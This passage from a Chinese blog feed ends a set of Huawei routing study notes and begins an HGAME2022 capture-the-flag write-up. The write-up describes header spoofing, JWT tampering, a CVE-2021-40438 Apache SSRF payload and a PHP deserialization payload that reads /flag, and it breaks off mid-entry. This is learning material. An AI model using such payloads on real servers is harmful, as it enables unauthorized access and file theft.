时该路由器为路由转发的最后一跳路由器。</p><p>直连路由的下一跳地址并不是其他设备上的接口地址，因为该路由的目的网段为接口所在 网段，本接口就是最后一跳，不需要再转发给下一跳，所以在路由表中的下一跳地址就是 接口自身地址。</p><p> 使用直连路由进行路由转发时，转发的动作不是交给下一跳，而是查询ARP表项，根据ARP 表项封装报文，将报文发送到目的IP。</p><p>并不是所有接口生成的直连路由都会出现在路由表中，直连路由出现在路由表中的前提是该接口的物理状态、协议状态都为up</p><h3 id="最优路由条目优选"><a href="#最优路由条目优选" class="headerlink" title="最优路由条目优选"></a>最优路由条目优选</h3><p>ip路由表：</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220206224832828.png" alt="image-20220206224832828"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220206224847226.png" alt="image-20220206224847226"></p><p>Preference用于不同路由协议间路由优先级的比较，Cost用于同一种路由协议内部不同路由的优先级的比较。在业界，Cost也被称为<strong>路由度量值</strong>（Metric）。</p><p><strong>路由优先级 - 常见默认值</strong></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220206230417214.png" alt="image-20220206230417214"></p><p>优先级值（Preference）越小代表加入路由表的优先级越高</p><p>拥有最高优先级的路由将被添加进路由表</p><p><strong>度量值 (cost)- 基本概念</strong></p><p>当路由器通过某种协议发现了多条到达同一个目的网络的路由时(拥有相同的路由优先级)，度量值将作为路由优选的依据之一。</p><p>路由度量值表示到达这条路由所指目的地址的代价。</p><p>一些常用的度量值有：跳数、带宽、时延、代价、负载、可靠性等</p><p>度量数值越小越优先，度量值最小路由将会被添加到路由表中</p><h3 id="路由转发"><a href="#路由转发" class="headerlink" title="路由转发"></a>路由转发</h3><h4 id="最长匹配原则"><a href="#最长匹配原则" class="headerlink" title="最长匹配原则"></a>最长匹配原则</h4><p>当路由器收到一个IP数据包时，会将数据包的目的IP地址与自己本地路由表中的所有路由表项进行逐位比对，直到找到匹配度最长的条目，这就是最长前缀匹配机制。</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220206231244641.png" alt="image-20220206231244641"></p><p><strong>示例：</strong></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220206231409791.png" alt="image-20220206231409791"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220206231416129.png" alt="image-20220206231416129"></p><h4 id="路由转发流程"><a href="#路由转发流程" class="headerlink" title="路由转发流程"></a>路由转发流程</h4><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220206231523631.png" alt="image-20220206231523631"></p><p>来自10.0.1.0/24网段的IP报文想要去往40.0.1.0/24网段，首先到达网关，网关查找路由表项， 确定转发的下一跳、出接口，之后报文转发给R2。报文到达R2之后，R2通过查找路由表项转发给R3，R3收到后查找路由表项，发现IP报文目的IP属于本地接口所在网段，直接本地转发。</p><h2 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h2><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>静态路由由网络管理员手动配置，配置方便，对系统要求低，适用于拓扑结构简单并且稳定的小型网络</p><p>缺点是不能自动适应网络拓扑的变化，需要人工干预。</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220206234934320.png" alt="image-20220206234934320"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220206234942785.png" alt="image-20220206234942785"></p><h3 id="缺省路由"><a href="#缺省路由" class="headerlink" title="缺省路由"></a>缺省路由</h3><p>缺省路由是一种特殊的路由，当报文没有在路由表中找到匹配的具体路由表项时才使用的路由。如果报文的目的地址不能与路由表的任何目的地址相匹配，那么该报文将选取缺省路由进行转发</p><p>缺省路由在路由表中的形式为0.0.0.0/0，缺省路由也叫做默认路由</p><p>缺省路由一般用于企业网络出口，配置一条缺省路由让出口设备能够转发前往internet上任意地址的ip报文。</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220206235235695.png" alt="image-20220206235235695"></p><h2 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h2><p>当网络规模越来越大时，使用手动配置静态路由的方式获取路由条目将变得越发复杂，同时在拓扑发生变化时不能及时、灵活响应</p><p> 动态路由协议有自己的路由算法，能够自动适应网络拓扑的变化，可以有效减少管理人员的工作量，适用于具有一定数量三层设备的网络。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>根据路由信息传递的内容、计算路由的算法，可以将动态路由协议分为两大类</p><ul><li> 距离矢量协议（Distance-Vector Protocol）</li><li>RIP</li><li>链路状态协议（Link-State Protocol）<ul><li>OSPF</li><li>IS-IS</li></ul></li><li>BGP使用一种基于距离矢量算法修改后的算法，该算法被称为路径矢量（Path Vector） 算法。因此在某些场合下，BGP也被称为路径矢量路由协议。</li></ul><p>根据工作范围不同，又可以分为</p><ul><li>内部网关协议IGP（Interior Gateway Protocol）:在一个自治系统内部运行。RIP、 OSPF、ISIS为常见的IGP协议。</li><li> 外部网关协议EGP（Exterior Gateway Protocol）：运行于不同自治系统之间。BGP 是目前最常用的EGP协议。</li></ul><h2 id="路由高级特性"><a href="#路由高级特性" class="headerlink" title="路由高级特性"></a>路由高级特性</h2><h3 id="路由递归"><a href="#路由递归" class="headerlink" title="路由递归"></a>路由递归</h3><p>路由必须有直连的下一跳才能够指导转发，但是路由生成时下一跳可能不是直连的，因此需要计算出一个直连的下一跳和对应的出接口，这个过程叫做路由递归，也被称为路由迭代。</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220207173411303.png" alt="image-20220207173411303"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220207173455073.png" alt="image-20220207173455073"></p><h3 id="等价路由"><a href="#等价路由" class="headerlink" title="等价路由"></a>等价路由</h3><p>路由表中存在等价路由之后，前往该目的网段的IP报文路由器会通过所有有效的接口、下一跳转发，这种转发行为被称为负载分担</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220207174156599.png" alt="image-20220207174156599"></p><h3 id="浮动路由"><a href="#浮动路由" class="headerlink" title="浮动路由"></a>浮动路由</h3><p>静态路由支持配置时手动指定优先级，可以通过配置目的地址/掩码相同、优先级不同、下一跳不同的静态路由，实现转发路径的备份。</p><p>浮动路由是主用路由的备份，保证链路故障时提供备份路由。主用路由下一跳可达时该备份路由不会出现在路由表中</p><p><strong>示例</strong></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220207174423411.png" alt="image-20220207174423411"></p><p> RTA-RTB之间的链路正常时，20.0.0.0/30的两条路由条目都是有效的条目，此时比较优先 级，下一跳为10.1.1.2的优先级60，下一跳为10.1.2.2的优先级70，因此下一跳为10.1.1.2的 加入路由表。</p><p>RTA-RTB之间的链路故障时，10.1.1.2不可达，因此下一跳为10.1.1.2的路由失效，此时前 往20.0.0.0/30的路由就只存在一条，该条路由将会被选入路由表。前往20.0.0.1的流量将会 被转发到10.1.2.2</p><h3 id="路由汇总"><a href="#路由汇总" class="headerlink" title="路由汇总"></a>路由汇总</h3><h4 id="CIDR-无类别域间路由"><a href="#CIDR-无类别域间路由" class="headerlink" title="CIDR(无类别域间路由)"></a>CIDR(无类别域间路由)</h4><p>采用ip地址加掩码长度来标识网络和子网，而不是按照穿透的A、B、C等类型对网络地址进行划分</p><p>CIDR容许任意长度的掩码长度，将ip地址看出连续的地址空间，可以使用任意长度的前缀分配，多个连续的前缀可以聚合成一个网络，该特性可以有效减少路由表条目数量</p><h4 id="路由汇总需求"><a href="#路由汇总需求" class="headerlink" title="路由汇总需求"></a>路由汇总需求</h4><p>子网划分、VLSM解决了地址空间浪费的问题，但同时也带来了新的问题：路由表中的路由条目数量增加。</p><p>为减少路由条目数量可以使用路由汇总</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220213164244240.png" alt="image-20220213164244240"></p><p>对于一个大规模的网络来说，路由器或其他具备路由功能的设备势必需要维护大量的路由表项，为了维护臃肿的路由表，这些设备就不得不耗费大量的资源。同时，由于路由表的规模变大，会导致路由器在查表转发时效率降低。因此在<strong>保证网络中的路由器到各网段都具备IP可达性的同时，需要减小设备的路由表规模</strong>。一个网络如果具备科学的IP编址，并且进行合理的规划，是可以利用多种手段减小设备路由表规模的。一个非常常见而又有效的办法就是使用路由汇总（Route Summarization）。路由汇总又被称为路由聚合（Route  Aggregation），是<strong>将一组有规律的路由汇聚成一条路由，从而达到减小路由表规模以及优 化设备资源利用率的目的</strong>，我们把汇聚之前的这组路由称为精细路由或明细路由，把汇聚 之后的这条路由称为汇总路由或聚合路由</p><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220213164554367.png" alt="image-20220213164554367"></p><p> RTA上为了能够前往远端地址，需要为每一个远端网段配置一条明细路由。去往10.1.1.0/24、10.1.2.0/24、10.1.3.0/24…拥有相同下一跳。将拥有相同下一跳，一组有规律的路由汇总成 一条路由，这叫做路由汇总。</p><h4 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h4><p>将明细路由的目的网络都换算成二进制，然后排列起来，找出所有目的网络地址中&quot;相同的比特位&quot;</p><h4 id="汇总引发的问题"><a href="#汇总引发的问题" class="headerlink" title="汇总引发的问题"></a>汇总引发的问题</h4><p>路由汇总会造成环路问题</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220213165436927.png" alt="image-20220213165436927"></p><p>解决方法：</p><p>在RTB上增加一条指向NULL0的路由</p><p>一般来说一条路由，无论是静态的或者是动态的，都需要关联到一个出接口，路由的出接口指的是设备要到达一个目的网络时的出站接口。路由的出接口可以是该设备的物理接口， 例如百兆、千兆以太网接口，也可以是逻辑接口，例如VLAN接口（VLAN Interface），或者隧道（Tunnel）接口等。在众多类型的出接口中，有一种接口非常特殊，那就是Null （无效）接口，这种类型的接口只有一个编号，也就是0。Null0是一个系统保留的逻辑接 口，当网络设备在转发某些数据包时，如果使用出接口为Null0的路由，那么这些报文将被 直接丢弃，就像被扔进了一个黑洞里，因此出接口为Null0的路由又被称为黑洞路由</p><h4 id="精确汇总"><a href="#精确汇总" class="headerlink" title="精确汇总"></a>精确汇总</h4><p>当配置的静态汇总路由范围太广时可能会将流量发送到其他的网段导致数据包丢失，这种路由为不精确路由。为此配置汇总路由时要尽量精确，刚好包括所有的明细路由</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220213165937684.png" alt="image-20220213165937684"></p><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p><strong>路由器如何优选路由条目？</strong></p><p>首先根据preference选择，如果preference相同则继续比较度量值，如果度量值也相同， 则都会被加入路由表形成等价路由。</p><p><strong>如何配置实现浮动路由？</strong></p><p>首先根据preference选择，如果preference相同则继续比较度量值，如果度量值也相同， 则都会被加入路由表形成等价路由。</p><p><strong>将10.1.1.0/24、10.1.3.0/24、10.1.9.0/24汇总之后的网段是？</strong></p><p>10.1.0.0/20</p>]]></content>
      
      
      
        <tags>
            
            <tag> 华为ict </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME2022 wp</title>
      <link href="/2022/01/21/HGAME2022-wp/"/>
      <url>/2022/01/21/HGAME2022-wp/</url>
      
        <content type="html"><![CDATA[<p>带*为赛后复现</p><h1 id="第一周wp"><a href="#第一周wp" class="headerlink" title="第一周wp"></a>第一周wp</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="欢迎欢迎！热烈欢迎！"><a href="#欢迎欢迎！热烈欢迎！" class="headerlink" title="欢迎欢迎！热烈欢迎！"></a>欢迎欢迎！热烈欢迎！</h3><p>签到</p><h3 id="这个压缩包有点麻烦"><a href="#这个压缩包有点麻烦" class="headerlink" title="这个压缩包有点麻烦"></a>这个压缩包有点麻烦</h3><p>压缩包，先真加密，爆破得到密码，然后字典爆破，再明文爆破，最后得到的一个藏着伪加密压缩包的图片，破掉伪加密把压缩包解压能得到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220121171347731.png" alt="image-20220121171347731"></p><h3 id="好康的流量"><a href="#好康的流量" class="headerlink" title="好康的流量"></a>好康的流量</h3><p>wireshark打开，追踪tcp流得到一大串base64值，转成图片</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220121171627907.png" alt="image-20220121171627907"></p><p>stegslove看一下</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220121171645072.png" alt="image-20220121171645072"></p><p>找个在线扫条形码的网站扫一下得到前半部分，后半部分利用zsteg能直接看到</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220121171734983.png" alt="image-20220121171734983"></p><h3 id="群青-其实是幽灵东京）"><a href="#群青-其实是幽灵东京）" class="headerlink" title="群青(其实是幽灵东京）"></a>群青(其实是幽灵东京）</h3><p>第一个音频文件</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220123164910035.png" alt="image-20220123164910035"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220123164940731.png" alt="image-20220123164940731"></p><p>猜密码是yoasobi</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220123164849913.png" alt="image-20220123164849913"></p><p>得到一个网址，里面是sstv为文件名的音频文件，用robot36接收一下</p><p>得到一个二维码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220123171839098.png" alt="image-20220123171839098"></p><p>扫码拿到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220123171902080.png" alt="image-20220123171902080"></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-auth"><a href="#easy-auth" class="headerlink" title="easy_auth"></a>easy_auth</h3><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220121171811854.png" alt="image-20220121171811854"></p><p>题目描述暗示todo里藏着东西，看一下源码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220121171913651.png" alt="image-20220121171913651"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220121171925729.png" alt="image-20220121171925729"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220121172104885.png" alt="image-20220121172104885"></p><p>猜到flag可能再id为1的内容里</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220121172217273.png" alt="image-20220121172217273"></p><p>访问的时候显示没添加cookie或者token</p><p>抓包给他加个jwt</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220121172251918.png" alt="image-20220121172251918"></p><p>jwt可以根据前边的网页抓包得到的jwt修改</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220121172330976.png" alt="image-20220121172330976"></p><h3 id="蛛蛛-嘿嘿♥我的蛛蛛"><a href="#蛛蛛-嘿嘿♥我的蛛蛛" class="headerlink" title="蛛蛛...嘿嘿♥我的蛛蛛"></a>蛛蛛...嘿嘿♥我的蛛蛛</h3><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220121172512414.png" alt="image-20220121172512414"></p><pre class="language-python" data-language="python"><code class="language-python">from time import sleepimport requestsurl &#x3D; &quot;https:&#x2F;&#x2F;hgame-spider.vidar.club&#x2F;6c5920c09d&quot;key &#x3D; &quot;?key&#x3D;VmqCK2lB2LRY2sM%2F5rEjFXHRemjYkb%2BQ2YHG8z7oy1krIf6R%2FOVrA8Ho5G9rxahnu6%2BTfwj6ZRbt3YP405Y12Q%3D%3D&quot;for i in range(1, 1000):    url &#x3D; &quot;https:&#x2F;&#x2F;hgame-spider.vidar.club&#x2F;6c5920c09d&quot;    url &#x3D; url + key    print(url)    r &#x3D; requests.get(url&#x3D;url)    # if &#39;href&#39; in r.text:    print(r.text)    lstNew &#x3D; r.text    if &#39;href&#39; in lstNew:        start &#x3D; lstNew.find(&quot;href&#x3D;\&quot;?&quot;)        print(start)        end &#x3D; lstNew.find(&quot;D\&quot;&gt;点我试试&quot;)        print(end)        length &#x3D; len(&quot;href&#x3D;\&quot;&quot;)        l &#x3D; lstNew[start + length:end +1]        key &#x3D; l        print(key)        if key &#x3D;&#x3D; &#39;&#39;:            break        sleep(0.5)        if &quot;hgame&#123;&quot; in r.text:            print(r.text)            break    else:        print(r.text)        break</code></pre><p>写的脚本（好拉的编程</p><p>跑到第100关后在响应头里找</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220121172754893.png" alt="image-20220121172754893"></p><h3 id="Tetris-plus"><a href="#Tetris-plus" class="headerlink" title="Tetris plus"></a>Tetris plus</h3><p>源码里直接找</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220121172901215.png" alt="image-20220121172901215"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220121172914978.png" alt="image-20220121172914978"></p><h3 id="Fujiwara-Tofu-Shop"><a href="#Fujiwara-Tofu-Shop" class="headerlink" title="Fujiwara Tofu Shop"></a>Fujiwara Tofu Shop</h3><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220121172941617.png" alt="image-20220121172941617"></p><p>先加个referer头为qiumingshan.net</p><p>然后改ua</p><p>再改cookie  flavor = Raspberry</p><p>然后再加上一个Gasoline:100</p><p>再是要求本地登录，但是过滤了xff，换个头就行</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-1327848764.png" alt="image-20220121172941618"></p><h2 id="IOT"><a href="#IOT" class="headerlink" title="IOT"></a>IOT</h2><h3 id="饭卡的uno"><a href="#饭卡的uno" class="headerlink" title="饭卡的uno"></a>饭卡的uno</h3><p>不会iot，但是这个把附件拖了ida里就能看见flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220121173504075.png" alt="image-20220121173504075"></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy RSA"></a>Easy RSA</h3><p>已知p，q，e和密文求明文的rsa</p><pre class="language-python" data-language="python"><code class="language-python">import libnumfrom Crypto.Util.number import long_to_bytesstring &#x3D; &#39;&#39;flag &#x3D; [(12433, 149, 197, 104), (8147, 131, 167, 6633), (10687, 211, 197, 35594), (19681, 131, 211, 15710), (33577, 251, 211, 38798), (30241, 157, 251, 35973), (293, 211, 157, 31548), (26459, 179, 149, 4778), (27479, 149, 223, 32728), (9029, 223, 137, 20696), (4649, 149, 151, 13418), (11783, 223, 251, 14239), (13537, 179, 137, 11702), (3835, 167, 139, 20051), (30983, 149, 227, 23928), (17581, 157, 131, 5855), (35381, 223, 179, 37774), (2357, 151, 223, 1849), (22649, 211, 229, 7348), (1151, 179, 223, 17982), (8431, 251, 163, 30226), (38501, 193, 211, 30559), (14549, 211, 151, 21143), (24781, 239, 241, 45604), (8051, 179, 131, 7994), (863, 181, 131, 11493), (1117, 239, 157, 12579), (7561, 149, 199, 8960), (19813, 239, 229, 53463), (4943, 131, 157, 14606), (29077, 191, 181, 33446), (18583, 211, 163, 31800), (30643, 173, 191, 27293), (11617, 223, 251, 13448), (19051, 191, 151, 21676), (18367, 179, 157, 14139), (18861, 149, 191, 5139), (9581, 211, 193, 25595)]for x in range(38):    c &#x3D; flag[x][3]    q &#x3D; flag[x][2]    p &#x3D; flag[x][1]    n &#x3D; p*q    e &#x3D; flag[x][0]    d &#x3D; libnum.invmod(e, (p - 1) * (q - 1))    m &#x3D; pow(c, d, n)      string +&#x3D; str(long_to_bytes(m),&#39;utf-8&#39;)print(string)</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220121213332698.png" alt="image-20220121213332698"></p><h3 id="English-Novel"><a href="#English-Novel" class="headerlink" title="English Novel"></a>English Novel</h3><p>给了四个文件，一个小说原文，一个加密后的小说，一个加密脚本，一个flag密文</p><p>先根据小说原文里的标点通过Linux的grep命令看一下相对的密文</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220122003056261.png" alt="image-20220122003056261"></p><p>再根据加密脚本逆向写出求key的脚本，然后是求密文（真的好拉的编程</p><pre class="language-python" data-language="python"><code class="language-python">def encrypt(data, key):    #   assert len(data) &lt;&#x3D; len(key)    result &#x3D; &quot;&quot;    for i in range(len(data)):        if data[i].isupper():            result +&#x3D; chr((ord(data[i]) - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;))        elif data[i].islower():            result +&#x3D; chr((ord(data[i]) - ord(&#39;a&#39;) + key[i]) % 26 + ord(&#39;a&#39;))        else:            result +&#x3D; data[i]    return resultdef decrypt(result, key):    #   assert len(data) &lt;&#x3D; len(key)    data &#x3D; &quot;&quot;    for i in range(len(result)):        if result[i].isupper():            #result +&#x3D; chr((ord(data[i]) - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;))            for k in range(65,90):#python这个对负数求余真不知道怎么逆了，只能爆破了                result1 &#x3D; chr((k - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;))                if result1 &#x3D;&#x3D; result[i]:                    data +&#x3D; chr(k)        elif result[i].islower():            for k in range(96,123):                result1 &#x3D; chr((ord(chr(k)) - ord(&#39;a&#39;) + key[i]) % 26 + ord(&#39;a&#39;))                if result1 &#x3D;&#x3D; result[i]:                    data +&#x3D; chr(k)        else:            data +&#x3D; result[i]    print(data)def decryptkey(data1, result1):    keyboard &#x3D; []    for n in range(25):        for i in range(len(data1)):            if data[i].isupper():                # result +&#x3D; chr((ord(data[i]) - ord(&#39;A&#39;) + key[i]) % 26 + ord(&#39;A&#39;))                key &#x3D; str((ord(result1[i]) - ord(&#39;A&#39;) + (26 * n)) + ord(&#39;A&#39;) - ord(data1[i]))                keyboard.append(key)            elif data[i].islower():                key &#x3D; str((ord(result1[i]) - ord(&#39;a&#39;) + (26 * n)) + ord(&#39;a&#39;) - ord(data1[i]))                keyboard.append(key)            else:                key &#x3D; 0                keyboard.append(key)        n &#x3D; str(n)        for i in keyboard:            print(i, end&#x3D;&#39;,&#39;)        print(&#39;&#x2F;n&#39;)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    data &#x3D; &quot;&quot;&quot;urveying the ground, Snowball declared that this was just the place for a windmill&quot;&quot;&quot;#这里写原文    result &#x3D; &quot;klsyf&#123;W0_j0v_ca0z_&#39;Ks0ao-bln1qstxp_juqfqy&#39;?&#125;&quot;#这里写密文    a &#x3D; [3, 5, -8, 12, 1, -2, -7, 10, 0, -15, 1, 1, 0, 18, -13, -7, 3, 12, 20, 0, 0, -16, 4, 1, -17, 12, 0, 13, -4, 0, -1, 15, 0, -4, 25, -17, 1, -3, 0, -12, 14, 3, 3, 0, 0, 8, -8, 6, 0, 0, 21, 7, 0, -5, -20, -6, -17, 0, -6, 13, 8, 0,2, 1, 20, 20, -1, 0, 16, -10, -1, 0, 21, 0, -6, -5, 9, 18, 10, 16, 10, 5, 0, 0, 0, 6, -8, -1, 7, 0, 20, 9, 2, 3, -3]    #decryptkey(data, result)    decrypt(result, a)    #print(encrypt(data, a))</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220122003437238.png" alt="image-20220122003437238"></p><p>这个flag在单引号里边的部分还是有点问题，可能是因为key的关系，但是由attfck能猜出attack，由pla1qtext能猜出plaintext，然后改完之后搜一下<img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220122003614141.png" alt="image-20220122003614141"></p><p>最终flag</p><p>hgame{D0_y0u_kn0w_&#39;Kn0wn-pla1ntext_attack&#39;?}</p><h1 id="第二周wp"><a href="#第二周wp" class="headerlink" title="第二周wp"></a>第二周wp</h1><h2 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache!*"></a>Apache!*</h3><p>有备份文件</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220205114347850.png" alt="image-20220205114347850"></p><p>根据题目描述应该是ssrf漏洞，结合apache版本能搜到CVE-2021-40438</p><pre class="language-none"><code class="language-none">?unix|http:&#x2F;&#x2F;internal.host&#x2F;</code></pre><p>但是网上的 exp 大多是 Apache 直接作为代理服务器的情况，这题给了 Apache 的配置文件 https-vhosts.conf , &#39;/&#39; 提供静态资源服务， &#39;/proxy&#39; 提供代理服务。</p><p>所以要在/proxy路径下用payload</p><h3 id="webpack-engine"><a href="#webpack-engine" class="headerlink" title="webpack-engine"></a>webpack-engine</h3><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220129140416825.png" alt="image-20220129140416825"></p><p>看源码，两次base64解码得到flag</p><pre class="language-none"><code class="language-none">hgame&#123;D0nt_f0r9et_2_ClOs3_S0urce_m@p&#125;</code></pre><h3 id="一本单词书"><a href="#一本单词书" class="headerlink" title="一本单词书"></a>一本单词书</h3><p>看源码有<a href="http://www.zip的提示/">www.zip的提示</a></p><p>代码审计一下</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220129140800363.png" alt="image-20220129140800363"></p><p>简单的用户判断</p><p>绕过之后</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220129140849923.png" alt="image-20220129140849923"></p><p>看index.php</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220129140911249.png" alt="image-20220129140911249"></p><p>大致逻辑就是将输入的传入get.php和save.php进行处理</p><p>save.php</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220129141059537.png" alt="image-20220129141059537"></p><p>将传入的单词的key和value写入文件中，并利用|来将key和value的序列化之后的值分隔。</p><p>get.php</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220129141542508.png" alt="image-20220129141542508"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220129141208348.png" alt="image-20220129141208348"></p><p>读取save.php中创建的文件的内容</p><p>evil.php</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220129141359385.png" alt="image-20220129141359385"></p><p>看见wakeup方法，再联系get.php时的unserialize可以猜测这里是要利用反序列化让file=/flag然后令flag变量的值变为flag再利用get.php将其读出来</p><p>这里要注意序列化的内容要在填在单词的位置，将其作为数组的key而不是value，否则在encode函数时会对value再进行一次序列化导致payload改变，无法执行反序列化操作</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220129184316177.png" alt="image-20220129184316177"></p><p>还要在反序列化的payload前添加|符号</p><p>让|后的部分执行decode函数中的反序列化</p><p>将evil类中的file赋值为/flag，从而让flag=/flag文件中的内容</p><p>这里的if过滤没啥用</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220129185352257.png" alt="image-20220129185352257"></p><p>最终payload</p><pre class="language-php" data-language="php"><code class="language-php">&#123;|O:4:&quot;Evil&quot;:2:&#123;s:4:&quot;file&quot;;s:4:&quot;flag&quot;;s:4:&quot;flag&quot;;N;&#125;</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220129185511329.png" alt="image-20220129185511329"></p><h3 id="Pokemon"><a href="#Pokemon" class="headerlink" title="Pokemon"></a>Pokemon</h3><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220130223228959.png" 